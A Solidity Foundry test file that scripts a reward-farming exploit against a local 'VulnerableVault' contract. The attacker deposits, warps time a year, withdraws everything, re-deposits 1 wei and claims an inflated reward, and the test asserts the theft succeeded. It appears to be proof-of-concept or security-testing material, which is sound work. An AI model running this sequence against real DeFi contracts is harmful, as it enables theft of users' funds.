// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

contract RewardFarmingExploitTest is Test {
    VulnerableVault target;
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        // Deploy the vulnerable contract
        target = new VulnerableVault();
        
        // Fund the attacker and the contract
        vm.deal(attacker, 10 ether);
        vm.deal(address(target), 100 ether);
    }
    
    function test_RewardFarmingExploit() public {
        // Step 1: Attacker deposits 10 ETH
        vm.startPrank(attacker);
        target.deposit{value: 10 ether}();
        
        // Step 2: Fast forward time by 1 year
        vm.warp(block.timestamp + 365 days);
        
        // Step 3: Attacker withdraws all 10 ETH
        target.withdrawAll();
        
        // Step 4: Attacker deposits 1 wei to reset balance
        target.deposit{value: 1 wei}();
        
        // Step 5: Attacker claims reward based on old timeframe
        uint256 rewardBefore = target.calculateReward(attacker);
        target.claimReward();
        uint256 rewardAfter = target.calculateReward(attacker);
        vm.stopPrank();
        
        // Assert exploit success
        assertGt(attacker.balance, 10 ether, "Attacker should have received inflated rewards");
        assertEq(rewardAfter, 0, "Reward should be reset after claiming");
    }
}
